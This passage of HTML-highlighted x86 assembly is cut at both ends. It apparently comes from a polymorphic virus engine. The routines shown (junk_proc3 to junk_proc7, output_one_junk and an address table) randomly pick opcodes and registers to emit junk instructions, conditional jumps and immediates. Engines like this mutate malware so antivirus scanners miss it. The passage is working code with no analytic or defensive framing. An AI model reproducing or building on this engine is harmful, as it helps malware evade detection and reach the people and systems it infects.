      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">; force 16/32bit</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Table2_len</span><span class="sc0">                       </span><span class="sc1">; take a random operation</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; from the Table2</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">; toggle size</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_jreg</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_jreg</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">                          </span><span class="sc1">; make reg to reg</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc3</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Table3_len</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; take a random operation</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; from the Table3</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table3</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_jreg</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc4</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; Here we create short</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">we_create_jcond</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; conditional jumps</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">output_one_junk</span><span class="sc0">                      </span><span class="sc1">; output one junk after</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                   </span><span class="sc1">; the conditional jump</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">we_create_jcond</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc5</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_jreg</span><span class="sc0">                          </span><span class="sc1">; Make imm to reg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">; choose the register</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Table5_len</span><span class="sc0">                       </span><span class="sc1">; take a random operation</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; from the Table1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">; force 16/32 bit</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">; save type</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">; store opcode</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; don't unmark these!!! I need some more conditions to make 8 bit mov</span><span class="sc0">
</span><span class="sc1">;      cmp ecx, 1                                ;</span><span class="sc0">
</span><span class="sc1">;      je mov_1632bit                            ; 16 or 32 bit?</span><span class="sc0">
</span><span class="sc1">;                                                ;</span><span class="sc0">
</span><span class="sc1">;mov_8bit:                                       ;</span><span class="sc0">
</span><span class="sc1">;      mov al, byte ptr [ebp+disp8]              ; 8 bit imm</span><span class="sc0">
</span><span class="sc1">;      stosb                                     ;</span><span class="sc0">
</span><span class="sc1">;      jmp quit_mov                              ;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mov_1632bit</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">; choose between 16 and</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; 32 bit</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_16</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp32</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; 32 bit imm</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_mov</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_16</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">; 16 bit imm</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; we need to override</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; the operand size</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp16</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosw</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">quit_mov</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">; done!</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc6</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">we_create_jcond</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table6</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">output_one_junk</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">we_create_jcond</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_proc7</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Table7_len</span><span class="sc0">                       </span><span class="sc1">; take a random operation</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; from the Table1</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Table7</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_one_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">over_one_junk</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">output_one_junk</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">junk_table_procs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                          </span><span class="sc1">; junk procs addresses</span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc2</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc3</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc4</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc5</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junk_proc6</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
